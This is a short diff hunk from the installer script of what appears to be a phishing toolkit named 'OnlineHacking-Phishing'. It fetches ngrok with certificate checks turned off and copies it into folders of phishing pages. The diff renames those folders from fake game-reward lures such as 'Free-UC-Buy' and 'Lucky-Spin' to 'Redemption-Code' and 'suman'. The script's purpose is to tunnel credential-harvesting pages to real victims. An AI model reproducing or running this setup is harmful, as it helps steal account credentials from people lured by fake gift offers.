@@ -28,9 +28,8 @@ apt install gnome-terminal -y
 clear
 wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip --no-check-certificate
 unzip ngrok-stable-linux-amd64.zip
-cp -R ngrok OnlineHacking/secnhack phs/BonusChallenge-Free-Gift-OH/
-cp -R ngrok OnlineHacking/secnhack phs/Free-UC-Buy-OH/
-cp -R ngrok OnlineHacking/secnhack phs/Lucky-Spin-OH/
+cp -R ngrok OnlineHacking/secnhack phs/Redemption-Code/
+cp -R ngrok OnlineHacking/secnhack phs/suman/
 chmod 7777 OnlineHacking-Phishing.sh
 clear
 echo ""
